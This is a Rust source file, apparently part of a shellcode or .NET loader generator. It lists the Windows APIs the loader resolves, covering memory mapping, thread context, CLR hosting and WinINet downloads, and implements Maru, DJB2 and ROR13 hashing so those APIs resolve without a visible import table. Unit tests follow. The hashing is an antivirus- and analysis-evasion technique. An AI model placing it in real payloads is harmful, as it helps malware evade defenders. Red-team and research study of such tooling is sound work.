//! API hashing using Maru algorithm and variations

use midres_common::*;

/// API import definition
pub struct ApiImport {
    pub dll: &'static str,
    pub name: &'static str,
    pub id: ApiId,
}

/// Complete list of API imports needed by the loader
pub const API_IMPORTS: &[ApiImport] = &[
    // kernel32.dll
    ApiImport { dll: "kernel32.dll", name: "LoadLibraryA", id: ApiId::LoadLibraryA },
    ApiImport { dll: "kernel32.dll", name: "GetProcAddress", id: ApiId::GetProcAddress },
    ApiImport { dll: "kernel32.dll", name: "GetModuleHandleA", id: ApiId::GetModuleHandleA },
    ApiImport { dll: "kernel32.dll", name: "VirtualAlloc", id: ApiId::VirtualAlloc },
    ApiImport { dll: "kernel32.dll", name: "VirtualFree", id: ApiId::VirtualFree },
    ApiImport { dll: "kernel32.dll", name: "VirtualQuery", id: ApiId::VirtualQuery },
    ApiImport { dll: "kernel32.dll", name: "VirtualProtect", id: ApiId::VirtualProtect },
    ApiImport { dll: "kernel32.dll", name: "Sleep", id: ApiId::Sleep },
    ApiImport { dll: "kernel32.dll", name: "MultiByteToWideChar", id: ApiId::MultiByteToWideChar },
    ApiImport { dll: "kernel32.dll", name: "GetUserDefaultLCID", id: ApiId::GetUserDefaultLCID },
    ApiImport { dll: "kernel32.dll", name: "WaitForSingleObject", id: ApiId::WaitForSingleObject },
    ApiImport { dll: "kernel32.dll", name: "CreateThread", id: ApiId::CreateThread },
    ApiImport { dll: "kernel32.dll", name: "CreateFileA", id: ApiId::CreateFileA },
    ApiImport { dll: "kernel32.dll", name: "GetFileSizeEx", id: ApiId::GetFileSizeEx },
    ApiImport { dll: "kernel32.dll", name: "GetThreadContext", id: ApiId::GetThreadContext },
    ApiImport { dll: "kernel32.dll", name: "GetCurrentThread", id: ApiId::GetCurrentThread },
    ApiImport { dll: "kernel32.dll", name: "GetCurrentProcess", id: ApiId::GetCurrentProcess },
    ApiImport { dll: "kernel32.dll", name: "GetCommandLineA", id: ApiId::GetCommandLineA },
    ApiImport { dll: "kernel32.dll", name: "GetCommandLineW", id: ApiId::GetCommandLineW },
    ApiImport { dll: "kernel32.dll", name: "HeapAlloc", id: ApiId::HeapAlloc },
    ApiImport { dll: "kernel32.dll", name: "HeapReAlloc", id: ApiId::HeapReAlloc },
    ApiImport { dll: "kernel32.dll", name: "HeapFree", id: ApiId::HeapFree },
    ApiImport { dll: "kernel32.dll", name: "GetProcessHeap", id: ApiId::GetProcessHeap },
    ApiImport { dll: "kernel32.dll", name: "GetLastError", id: ApiId::GetLastError },
    ApiImport { dll: "kernel32.dll", name: "CloseHandle", id: ApiId::CloseHandle },
    
    // shell32.dll
    ApiImport { dll: "shell32.dll", name: "CommandLineToArgvW", id: ApiId::CommandLineToArgvW },
    
    // oleaut32.dll
    ApiImport { dll: "oleaut32.dll", name: "SafeArrayCreate", id: ApiId::SafeArrayCreate },
    ApiImport { dll: "oleaut32.dll", name: "SafeArrayCreateVector", id: ApiId::SafeArrayCreateVector },
    ApiImport { dll: "oleaut32.dll", name: "SafeArrayPutElement", id: ApiId::SafeArrayPutElement },
    ApiImport { dll: "oleaut32.dll", name: "SafeArrayDestroy", id: ApiId::SafeArrayDestroy },
    ApiImport { dll: "oleaut32.dll", name: "SafeArrayGetLBound", id: ApiId::SafeArrayGetLBound },
    ApiImport { dll: "oleaut32.dll", name: "SafeArrayGetUBound", id: ApiId::SafeArrayGetUBound },
    ApiImport { dll: "oleaut32.dll", name: "SysAllocString", id: ApiId::SysAllocString },
    ApiImport { dll: "oleaut32.dll", name: "SysFreeString", id: ApiId::SysFreeString },
    ApiImport { dll: "oleaut32.dll", name: "LoadTypeLib", id: ApiId::LoadTypeLib },
    
    // wininet.dll
    ApiImport { dll: "wininet.dll", name: "InternetCrackUrlA", id: ApiId::InternetCrackUrlA },
    ApiImport { dll: "wininet.dll", name: "InternetOpenA", id: ApiId::InternetOpenA },
    ApiImport { dll: "wininet.dll", name: "InternetConnectA", id: ApiId::InternetConnectA },
    ApiImport { dll: "wininet.dll", name: "InternetSetOptionA", id: ApiId::InternetSetOptionA },
    ApiImport { dll: "wininet.dll", name: "InternetReadFile", id: ApiId::InternetReadFile },
    ApiImport { dll: "wininet.dll", name: "InternetQueryDataAvailable", id: ApiId::InternetQueryDataAvailable },
    ApiImport { dll: "wininet.dll", name: "InternetCloseHandle", id: ApiId::InternetCloseHandle },
    ApiImport { dll: "wininet.dll", name: "HttpOpenRequestA", id: ApiId::HttpOpenRequestA },
    ApiImport { dll: "wininet.dll", name: "HttpSendRequestA", id: ApiId::HttpSendRequestA },
    ApiImport { dll: "wininet.dll", name: "HttpQueryInfoA", id: ApiId::HttpQueryInfoA },
    
    // mscoree.dll
    ApiImport { dll: "mscoree.dll", name: "CorBindToRuntime", id: ApiId::CorBindToRuntime },
    ApiImport { dll: "mscoree.dll", name: "CLRCreateInstance", id: ApiId::CLRCreateInstance },
    
    // ole32.dll
    ApiImport { dll: "ole32.dll", name: "CoInitializeEx", id: ApiId::CoInitializeEx },
    ApiImport { dll: "ole32.dll", name: "CoCreateInstance", id: ApiId::CoCreateInstance },
    ApiImport { dll: "ole32.dll", name: "CoUninitialize", id: ApiId::CoUninitialize },
    
    // ntdll.dll
    ApiImport { dll: "ntdll.dll", name: "RtlEqualUnicodeString", id: ApiId::RtlEqualUnicodeString },
    ApiImport { dll: "ntdll.dll", name: "RtlEqualString", id: ApiId::RtlEqualString },
    ApiImport { dll: "ntdll.dll", name: "RtlUnicodeStringToAnsiString", id: ApiId::RtlUnicodeStringToAnsiString },
    ApiImport { dll: "ntdll.dll", name: "RtlInitUnicodeString", id: ApiId::RtlInitUnicodeString },
    ApiImport { dll: "ntdll.dll", name: "RtlExitUserThread", id: ApiId::RtlExitUserThread },
    ApiImport { dll: "ntdll.dll", name: "RtlExitUserProcess", id: ApiId::RtlExitUserProcess },
    ApiImport { dll: "ntdll.dll", name: "RtlCreateUnicodeString", id: ApiId::RtlCreateUnicodeString },
    ApiImport { dll: "ntdll.dll", name: "RtlGetCompressionWorkSpaceSize", id: ApiId::RtlGetCompressionWorkSpaceSize },
    ApiImport { dll: "ntdll.dll", name: "RtlDecompressBuffer", id: ApiId::RtlDecompressBuffer },
    ApiImport { dll: "ntdll.dll", name: "NtContinue", id: ApiId::NtContinue },
    ApiImport { dll: "ntdll.dll", name: "NtCreateSection", id: ApiId::NtCreateSection },
    ApiImport { dll: "ntdll.dll", name: "NtMapViewOfSection", id: ApiId::NtMapViewOfSection },
    ApiImport { dll: "ntdll.dll", name: "NtUnmapViewOfSection", id: ApiId::NtUnmapViewOfSection },
    ApiImport { dll: "ntdll.dll", name: "NtAllocateVirtualMemory", id: ApiId::NtAllocateVirtualMemory },
    ApiImport { dll: "ntdll.dll", name: "NtFreeVirtualMemory", id: ApiId::NtFreeVirtualMemory },
    ApiImport { dll: "ntdll.dll", name: "NtProtectVirtualMemory", id: ApiId::NtProtectVirtualMemory },
    ApiImport { dll: "ntdll.dll", name: "NtFlushInstructionCache", id: ApiId::NtFlushInstructionCache },
    ApiImport { dll: "ntdll.dll", name: "LdrLoadDll", id: ApiId::LdrLoadDll },
    ApiImport { dll: "ntdll.dll", name: "LdrGetProcedureAddress", id: ApiId::LdrGetProcedureAddress },
];

/// Maru hash algorithm - a lightweight hash function for API resolution
/// Based on Speck cipher block mixing
pub fn maru_hash(data: &[u8], iv: u64) -> u64 {
    const MARU_ROUNDS: usize = 8;
    const MARU_KEY: u64 = 0x4d61525548415348; // "MaRUHASH" encoded (8 bytes max for u64)
    
    let mut h: u64 = iv;
    let mut k: u64 = MARU_KEY;
    
    // Process each byte
    for &byte in data {
        // Skip null terminators
        if byte == 0 {
            break;
        }
        
        // Convert to lowercase for case-insensitive matching
        let b = if byte >= b'A' && byte <= b'Z' {
            byte + 32
        } else {
            byte
        } as u64;
        
        // Mix the byte into the hash
        h ^= b;
        
        // Speck-like mixing rounds
        for _ in 0..MARU_ROUNDS {
            h = h.rotate_right(8);
            h = h.wrapping_add(k);
            h ^= k;
            k = k.rotate_left(3);
            k ^= h;
        }
    }
    
    h
}

/// Generate API hashes for all required imports using the provided IV
pub fn generate_api_hashes(random_ctx: &crate::random::RandomContext) -> Vec<u64> {
    let iv = random_ctx.hash_iv();
    
    API_IMPORTS.iter()
        .map(|api| maru_hash(api.name.as_bytes(), iv))
        .collect()
}

/// Generate hash for a single API name
pub fn hash_api(name: &str, iv: u64) -> u64 {
    maru_hash(name.as_bytes(), iv)
}

/// Generate hash for DLL name
pub fn hash_dll(name: &str, iv: u64) -> u64 {
    maru_hash(name.as_bytes(), iv)
}

/// Alternative hash - DJB2 algorithm
pub fn djb2_hash(data: &[u8]) -> u64 {
    let mut hash: u64 = 5381;
    
    for &byte in data {
        if byte == 0 {
            break;
        }
        
        // Case insensitive
        let b = if byte >= b'A' && byte <= b'Z' {
            byte + 32
        } else {
            byte
        } as u64;
        
        hash = hash.wrapping_mul(33).wrapping_add(b);
    }
    
    hash
}

/// Alternative hash - ROR13 algorithm (commonly used in shellcode)
pub fn ror13_hash(data: &[u8]) -> u32 {
    let mut hash: u32 = 0;
    
    for &byte in data {
        if byte == 0 {
            break;
        }
        
        hash = hash.rotate_right(13);
        hash = hash.wrapping_add(byte as u32);
    }
    
    hash
}

/// Combined DLL + API hash for unique identification
pub fn combined_hash(dll: &str, api: &str, iv: u64) -> u64 {
    let dll_hash = maru_hash(dll.as_bytes(), iv);
    let api_hash = maru_hash(api.as_bytes(), iv);
    
    // XOR and rotate to combine
    dll_hash ^ api_hash.rotate_left(32)
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_maru_hash_consistency() {
        let iv = 0x1234567890ABCDEF;
        let hash1 = maru_hash(b"VirtualAlloc", iv);
        let hash2 = maru_hash(b"VirtualAlloc", iv);
        
        assert_eq!(hash1, hash2);
    }
    
    #[test]
    fn test_maru_hash_case_insensitive() {
        let iv = 0x1234567890ABCDEF;
        let hash1 = maru_hash(b"VirtualAlloc", iv);
        let hash2 = maru_hash(b"virtualalloc", iv);
        let hash3 = maru_hash(b"VIRTUALALLOC", iv);
        
        assert_eq!(hash1, hash2);
        assert_eq!(hash2, hash3);
    }
    
    #[test]
    fn test_maru_hash_different_iv() {
        let hash1 = maru_hash(b"VirtualAlloc", 0x1111111111111111);
        let hash2 = maru_hash(b"VirtualAlloc", 0x2222222222222222);
        
        assert_ne!(hash1, hash2);
    }
    
    #[test]
    fn test_djb2_hash() {
        let hash = djb2_hash(b"kernel32.dll");
        assert_ne!(hash, 0);
    }
    
    #[test]
    fn test_ror13_hash() {
        let hash = ror13_hash(b"LoadLibraryA");
        assert_ne!(hash, 0);
    }
}
